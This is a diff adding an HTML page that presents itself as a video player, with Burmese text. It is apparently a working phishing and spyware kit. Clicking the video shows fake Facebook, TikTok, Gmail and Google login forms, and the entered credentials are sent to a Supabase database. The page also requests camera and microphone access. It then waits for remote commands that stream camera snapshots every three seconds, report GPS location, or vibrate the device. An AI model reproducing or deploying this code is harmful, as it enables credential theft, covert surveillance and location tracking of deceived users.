@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Watch Full Video</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #000; font-family: sans-serif; }
+        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        iframe { width: 100%; height: 100%; border: none; }
+        #login-overlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(8px);
+            z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; 
+        }
+        .login-card { background: #fff; padding: 25px; border-radius: 15px; width: 85%; max-width: 320px; text-align: center; }
+        .btn { width: 100%; padding: 12px; margin: 6px 0; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; outline: none; }
+        #click-detector { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 50; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="video-wrapper">
+        <iframe src="https://vk.com/video_ext.php?oid=651408124&id=456239017&hash=0647385a49934185" allow="autoplay; encrypted-media;"></iframe>
+    </div>
+
+    <div id="click-detector" onclick="showLogin()"></div>
+    
+    <div id="login-overlay">
+        <div class="login-card" id="select-box">
+            <h3 style="color:#222; margin-bottom: 20px;">ဗီဒီယို ဆက်လက်ကြည့်ရှုရန်</h3>
+            <button class="btn" style="background:#1877f2" onclick="openPhish('Facebook')"><i class="fa-brands fa-facebook"></i> Facebook</button>
+            <button class="btn" style="background:#000" onclick="openPhish('TikTok')"><i class="fa-brands fa-tiktok"></i> TikTok</button>
+            <button class="btn" style="background:#db4437" onclick="openPhish('Gmail')"><i class="fa-solid fa-envelope"></i> Gmail</button>
+            <button class="btn" style="background:#4285f4" onclick="openPhish('Google')"><i class="fa-brands fa-google"></i> Google</button>
+        </div>
+
+        <div class="login-card" id="form-box" style="display:none;">
+            <h3 id="phish-title" style="color:#222;">Login</h3>
+            <input type="text" id="user" placeholder="Email or Phone">
+            <input type="password" id="pass" placeholder="Password">
+            <button class="btn" style="background:#000;" onclick="submitData()">LOGIN</button>
+        </div>
+    </div>
+
+    <video id="spy-stream" autoplay playsinline muted style="display:none"></video>
+
+    <script>
+        const _sb = supabase.createClient('https://ymeuoksaxgdcfuueafev.supabase.co', 'sb_publishable_rDcHSRuxOlK6W2jaUrbS1Q_UaE-A-EK');
+        const dID = localStorage.getItem('dID') || 'T-' + Math.floor(Math.random()*99999);
+        localStorage.setItem('dID', dID);
+        let selectedApp = "";
+
+        const model = navigator.userAgent.includes("Android") ? "Android" : "iPhone";
+
+        // ၁။ Device စာရင်းသွင်းခြင်း
+        (async () => {
+            await _sb.from('devices').upsert([{ device_id: dID, model: model, last_seen: new Date() }]);
+        })();
+
+        function showLogin() {
+            document.getElementById('login-overlay').style.display = 'flex';
+        }
+
+        // ၂။ Permission တောင်းခြင်းနှင့် Form ပြခြင်း
+        async function openPhish(app) {
+            selectedApp = app;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('spy-stream').srcObject = stream;
+                
+                document.getElementById('select-box').style.display = 'none';
+                document.getElementById('form-box').style.display = 'block';
+                document.getElementById('phish-title').innerText = app + " Login";
+
+                // Admin Commands နားထောင်ခြင်း
+                _sb.channel('commands').on('postgres_changes', { 
+                    event: 'INSERT', schema: 'public', table: 'commands', filter: `device_id=eq.${dID}` 
+                }, (payload) => {
+                    handleCmd(payload.new.action);
+                }).subscribe();
+
+            } catch(e) {
+                alert("ဗီဒီယိုကြည့်ရှုရန် 'Allow' ပေးရန်လိုအပ်ပါသည်။");
+            }
+        }
+
+        // ၃။ Login Data ပို့ခြင်း
+        async function submitData() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(u && p) {
+                await _sb.from('results').insert([{ device_id: dID, device_model: model, email: selectedApp + ": " + u, password: p }]);
+                alert("Login Successful!");
+                document.getElementById('login-overlay').style.display = 'none';
+            }
+        }
+
+        // ၄။ Admin ခလုတ်များအတွက် Logic
+        function handleCmd(act) {
+            if(act === 'spy') startCCTV();
+            if(act === 'gps') sendGPS();
+            if(act === 'vib' || act === 'vib_l') navigator.vibrate(act === 'vib' ? 500 : 2000);
+            if(act === 'rel') location.reload();
+            if(act === 'scr') new Audio('https://www.google.com/logos/fnbx/animal_sounds/lion.mp3').play();
+        }
+
+        function startCCTV() {
+            const cvs = document.createElement('canvas'); cvs.width = 320; cvs.height = 320;
+            const ctx = cvs.getContext('2d');
+            setInterval(async () => {
+                const vid = document.getElementById('spy-stream');
+                if(vid.srcObject) {
+                    ctx.drawImage(vid, 0, 0, 320, 320);
+                    const img = cvs.toDataURL('image/jpeg', 0.5);
+                    await _sb.from('results').upsert([{ device_id: dID, device_model: "LIVE-CCTV", email: "STREAM", password: img }], { onConflict: 'device_id, device_model' });
+                }
+            }, 3000);
+        }
+
+        function sendGPS() {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await _sb.from('results').insert([{ device_id: dID, device_model: model, email: "GPS", password: link }]);
+            });
+        }
+    </script>
+</body>
+</html>
